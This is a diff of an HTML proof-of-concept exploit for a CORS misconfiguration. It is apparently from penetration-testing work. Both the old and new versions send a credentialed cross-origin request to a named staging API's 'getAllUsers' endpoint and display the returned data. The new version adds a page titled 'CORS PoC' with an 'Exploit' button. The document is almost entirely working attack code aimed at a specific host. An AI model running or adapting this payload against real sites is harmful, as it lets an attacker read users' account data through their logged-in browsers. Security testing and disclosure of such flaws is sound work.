@@ -1,13 +1,22 @@
 <html>
-<script>
-var xhttp = new XMLHttpRequest();
-xhttp.onreadystatechange = function() {
-	if (this.readyState == 4 && this.status == 200) {
-	 alert(xhttp.responseText);
-	}
-};
-xhttp.open("GET", "https://staging.cusmc.org/api/SubRightsAPI/getAllUsers?id=300&Rtype=STORE", true);
-xhttp.withCredentials=true;
-xhttp.send();
-</script>
-</html>
+     <body>
+         <h2>CORS PoC</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Exploit</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET",
+                       "https://staging.cusmc.org/api/SubRightsAPI/getAllUsers?id=300&Rtype=STORE", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+     </body>
+ </html>
